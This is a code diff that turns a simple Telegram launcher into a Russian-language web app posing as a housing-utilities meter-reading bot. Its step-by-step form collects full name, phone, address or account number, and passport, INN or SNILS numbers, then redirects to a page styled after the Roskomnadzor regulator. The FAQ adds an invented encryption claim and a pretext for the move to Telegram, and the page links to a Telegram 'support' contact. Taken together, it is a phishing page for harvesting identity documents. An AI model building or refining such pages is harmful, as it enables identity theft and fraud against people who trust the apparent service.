@@ -1,44 +1,279 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ЖКХ-бот</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            transition: all 0.3s ease;
-        }
-        .telegram-theme {
-            background-color: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-        }
-        .button-primary {
-            background-color: var(--tg-theme-button-color, #0088cc);
-            color: var(--tg-theme-button-text-color, #ffffff);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ЖКХ Web App</title>
+  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.development.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.22.9/Babel.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="telegram-theme min-h-screen flex flex-col items-center justify-center p-4">
-    <div id="app" class="w-full max-w-md text-center">
-        <h1 class="text-2xl font-bold mb-4">🏠 ЖКХ-бот ✨</h1>
-        <p id="message" class="mb-6">Добро пожаловать в ЖКХ-бот! Управляйте своими услугами легко и быстро!</p>
-        <div id="main-menu" class="space-y-2">
-            <button class="w-full p-2 rounded button-primary hover:opacity-90 transition" onclick="openWebApp()">Открыть ЖКХ</button>
-        </div>
-    </div>
-    <script>
-        // Initialize Telegram Web App
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+<body class="bg-gray-100 font-sans">
+  <div id="root" class="container mx-auto p-4"></div>
 
-        // Function to open the web app link within Telegram
-        function openWebApp() {
-            tg.openLink('https://benovitchben-collab.github.io/my-first-project/JKX.html', { try_instant_view: true });
+  <script type="text/babel">
+    const { useState } = React;
+
+    // State machine states
+    const STATES = {
+      MAIN_MENU: 'main_menu',
+      FULLNAME: 'fullname',
+      PHONE: 'phone',
+      ACCOUNT_OR_ADDRESS_CHOICE: 'account_or_address_choice',
+      ACCOUNT_OR_ADDRESS_VALUE: 'account_or_address_value',
+      DOCUMENT_TYPE: 'document_type',
+      DOCUMENT_NUMBER: 'document_number',
+      FAQ: 'faq'
+    };
+
+    // Main App component
+    function App() {
+      const [state, setState] = useState(STATES.MAIN_MENU);
+      const [formData, setFormData] = useState({
+        fullname: '',
+        phone: '',
+        account_or_address_choice: '',
+        account_or_address_value: '',
+        document_type: '',
+        document_number: ''
+      });
+      const [error, setError] = useState('');
+
+      // Simulate saving data to localStorage
+      const saveData = (isComplete = false) => {
+        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+        const userId = 'web_user_' + Math.random().toString(36).substr(2, 9);
+        const username = 'web_user';
+        const record = `${timestamp}\t${userId}\t@${username} (ЖКХ)\t` +
+                      `${formData.fullname}\t${formData.phone}\t` +
+                      `${formData.account_or_address_choice} ${formData.account_or_address_value}\t` +
+                      `${formData.document_type} ${formData.document_number}\n`;
+        const existingData = localStorage.getItem('reg.txt') || '';
+        localStorage.setItem('reg.txt', existingData + record);
+        console.log('Saved:', record);
+      };
+
+      // Input validation functions
+      const validateFullname = (value) => {
+        const regex = /^[А-Яа-яЁё\s-]+$/;
+        return regex.test(value) ? '' : 'ФИО должно содержать только буквы.';
+      };
+
+      const validatePhone = (value) => {
+        const digits = value.replace(/[^0-9]/g, '');
+        if (!value.startsWith('+7') && !value.startsWith('7')) {
+          return 'Номер телефона должен начинаться с +7 или 7.';
         }
-    </script>
+        if (digits.length < 10 || digits.length > 11) {
+          return 'Номер телефона должен содержать 10 или 11 цифр.';
+        }
+        return '';
+      };
+
+      const validateAddress = (value) => {
+        return value.length >= 5 && /\d/.test(value)
+          ? ''
+          : 'Укажите корректный адрес (пример: г. Москва, ул. Ленина, д. 10).';
+      };
+
+      const validateAccount = (value) => {
+        return /^\d{4,}$/.test(value)
+          ? ''
+          : 'Номер лицевого счёта должен содержать только цифры (не менее 4).';
+      };
+
+      // Handle form submission
+      const handleSubmit = (e) => {
+        e.preventDefault();
+        const value = e.target.querySelector('input')?.value.trim() || '';
+        setError('');
+
+        if (state === STATES.FULLNAME) {
+          const errorMsg = validateFullname(value);
+          if (errorMsg) {
+            setError(errorMsg);
+            return;
+          }
+          setFormData({ ...formData, fullname: value.replace(/\s+/g, ' ') });
+          saveData();
+          setState(STATES.PHONE);
+        } else if (state === STATES.PHONE) {
+          const errorMsg = validatePhone(value);
+          if (errorMsg) {
+            setError(errorMsg);
+            return;
+          }
+          setFormData({ ...formData, phone: value });
+          saveData();
+          setState(STATES.ACCOUNT_OR_ADDRESS_CHOICE);
+        } else if (state === STATES.ACCOUNT_OR_ADDRESS_VALUE) {
+          const errorMsg = formData.account_or_address_choice === '🏠 Адрес'
+            ? validateAddress(value)
+            : validateAccount(value);
+          if (errorMsg) {
+            setError(errorMsg);
+            return;
+          }
+          setFormData({ ...formData, account_or_address_value: value });
+          saveData();
+          setState(STATES.DOCUMENT_TYPE);
+        } else if (state === STATES.DOCUMENT_NUMBER) {
+          setFormData({ ...formData, document_number: value });
+          saveData(true);
+          window.location.href = 'https://roskomnadzor.figma.site/';
+        }
+      };
+
+      // Handle navigation
+      const handleBack = () => {
+        if (state === STATES.FULLNAME) setState(STATES.MAIN_MENU);
+        else if (state === STATES.PHONE) setState(STATES.FULLNAME);
+        else if (state === STATES.ACCOUNT_OR_ADDRESS_CHOICE) setState(STATES.PHONE);
+        else if (state === STATES.ACCOUNT_OR_ADDRESS_VALUE) setState(STATES.ACCOUNT_OR_ADDRESS_CHOICE);
+        else if (state === STATES.DOCUMENT_TYPE) setState(STATES.ACCOUNT_OR_ADDRESS_VALUE);
+        else if (state === STATES.DOCUMENT_NUMBER) setState(STATES.DOCUMENT_TYPE);
+        else if (state === STATES.FAQ) setState(STATES.MAIN_MENU);
+        setError('');
+      };
+
+      // Render components based on state
+      const renderMainMenu = () => (
+        <div className="text-center">
+          <h1 className="text-2xl font-bold mb-4">🏠 Добро пожаловать в ЖКХ-бот!</h1>
+          <p className="mb-4">Управляйте своими услугами легко и быстро! ✨</p>
+          <div className="flex flex-col gap-2">
+            <button onClick={() => setState(STATES.FULLNAME)} className="bg-blue-500 text-white p-2 rounded">🔢 Передать показания</button>
+            <button onClick={() => setState(STATES.FAQ)} className="bg-blue-500 text-white p-2 rounded">❓ Частые вопросы</button>
+            <button onClick={() => alert(
+              '📋 Чтобы передать показания:\n' +
+              '1️⃣ Укажите ФИО.\n' +
+              '2️⃣ Введите номер телефона.\n' +
+              '3️⃣ Введите номер лицевого счета или адрес.\n' +
+              '4️⃣ Выберите документ и введите его номер.\n' +
+              '5️⃣ Получите подтверждение. ✨\n\n' +
+              'На любом этапе вы можете нажать "Назад", чтобы вернуться на предыдущий шаг. 💧'
+            )} className="bg-blue-500 text-white p-2 rounded">ℹ️ Инструкция</button>
+            <button onClick={() => window.open('https://t.me/techsupgkh', '_blank')} className="bg-blue-500 text-white p-2 rounded">📞 Связаться с техподдержкой</button>
+          </div>
+        </div>
+      );
+
+      const renderFAQ = () => (
+        <div className="text-center">
+          <h2 className="text-xl font-bold mb-4">❓ Частые вопросы</h2>
+          <div className="flex flex-col gap-2">
+            <button onClick={() => alert('📌 Показания счетчиков воды и электроэнергии необходимо передавать до 25 числа каждого месяца. 💧')}
+                    className="bg-gray-200 p-2 rounded">⏳ До какого числа нужно передавать показания?</button>
+            <button onClick={() => alert('⚠️ Плата будет начислена по среднему — исходя из показаний приборов учета за последние полгода. 🔥')}
+                    className="bg-gray-200 p-2 rounded">💸 Что будет, если не передать данные вовремя?</button>
+            <button onClick={() => alert('🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). ✨')}
+                    className="bg-gray-200 p-2 rounded">🔒 Это безопасно?</button>
+            <button onClick={() => alert('⚡️ В связи с нестабильной работой web-платформ был создан дополнительный ресурс. 💧')}
+                    className="bg-gray-200 p-2 rounded">⚡️ Почему теперь через Telegram?</button>
+            <button onClick={() => alert('✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌟')}
+                    className="bg-gray-200 p-2 rounded">🔁 Можно ли исправить ошибку?</button>
+            <button onClick={() => alert('👉 Паспорт, ИНН, СНИЛС или Лицевой счёт. 💧')}
+                    className="bg-gray-200 p-2 rounded">📑 Какие документы можно использовать?</button>
+            <button onClick={handleBack} className="bg-red-500 text-white p-2 rounded">↩️ Вернуться в меню</button>
+          </div>
+        </div>
+      );
+
+      const renderForm = () => {
+        let placeholder = '';
+        let inputType = 'text';
+        let title = '';
+        let choices = [];
+
+        if (state === STATES.FULLNAME) {
+          title = '👤 Укажите Фамилию Имя Отчество полностью (только текст):';
+          placeholder = 'Иванов Иван Иванович';
+        } else if (state === STATES.PHONE) {
+          title = '📞 Введите номер телефона (начните с +7 или 7, например: +79991234567):';
+          placeholder = '+79991234567';
+        } else if (state === STATES.ACCOUNT_OR_ADDRESS_CHOICE) {
+          title = 'Выберите способ идентификации:';
+          choices = ['🏠 Адрес', '💳 Лицевой счёт'];
+        } else if (state === STATES.ACCOUNT_OR_ADDRESS_VALUE) {
+          title = formData.account_or_address_choice === '🏠 Адрес'
+            ? 'Введите ваш адрес (пример: г. Москва, ул. Ленина, д. 10):'
+            : 'Введите номер лицевого счёта (пример: 40817810099910004312):';
+          placeholder = formData.account_or_address_choice === '🏠 Адрес'
+            ? 'г. Москва, ул. Ленина, д. 10'
+            : '40817810099910004312';
+        } else if (state === STATES.DOCUMENT_TYPE) {
+          title = 'Выберите документ:';
+          choices = ['📄 Паспорт', '🧾 ИНН', '🟢 СНИЛС'];
+        } else if (state === STATES.DOCUMENT_NUMBER) {
+          title = formData.document_type === 'Паспорт'
+            ? 'Введите серию и номер паспорта (пример: 4510 123456):'
+            : formData.document_type === 'ИНН'
+            ? 'Введите ИНН (пример: 500100732259):'
+            : 'Введите СНИЛС (пример: 112-233-445 95):';
+          placeholder = formData.document_type === 'Паспорт'
+            ? '4510 123456'
+            : formData.document_type === 'ИНН'
+            ? '500100732259'
+            : '112-233-445 95';
+        }
+
+        return (
+          <div className="text-center">
+            <h2 className="text-xl font-bold mb-4">УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</h2>
+            <h3 className="mb-4">{title}</h3>
+            {error && <p className="text-red-500 mb-4">❌ {error}</p>}
+            {choices.length > 0 ? (
+              <div className="flex flex-col gap-2">
+                {choices.map(choice => (
+                  <button
+                    key={choice}
+                    onClick={() => {
+                      if (state === STATES.ACCOUNT_OR_ADDRESS_CHOICE) {
+                        setFormData({ ...formData, account_or_address_choice: choice });
+                        saveData();
+                        setState(STATES.ACCOUNT_OR_ADDRESS_VALUE);
+                      } else if (state === STATES.DOCUMENT_TYPE) {
+                        setFormData({ ...formData, document_type: choice.replace(/[^А-Яа-я]/g, '') });
+                        saveData();
+                        setState(STATES.DOCUMENT_NUMBER);
+                      }
+                    }}
+                    className="bg-blue-500 text-white p-2 rounded"
+                  >
+                    {choice}
+                  </button>
+                ))}
+              </div>
+            ) : (
+              <form onSubmit={handleSubmit}>
+                <input
+                  type={inputType}
+                  placeholder={placeholder}
+                  className="border p-2 mb-4 w-full rounded"
+                  required
+                />
+                <div className="flex gap-2 justify-center">
+                  <button type="submit" className="bg-green-500 text-white p-2 rounded">Далее</button>
+                  <button type="button" onClick={handleBack} className="bg-red-500 text-white p-2 rounded">↩️ Назад</button>
+                </div>
+              </form>
+            )}
+          </div>
+        );
+      };
+
+      return (
+        <div className="max-w-md mx-auto bg-white p-6 rounded shadow">
+          {state === STATES.MAIN_MENU ? renderMainMenu() :
+           state === STATES.FAQ ? renderFAQ() :
+           renderForm()}
+        </div>
+      );
+    }
+
+    // Render the app
+    ReactDOM.render(<App />, document.getElementById('root'));
+  </script>
 </body>
 </html>
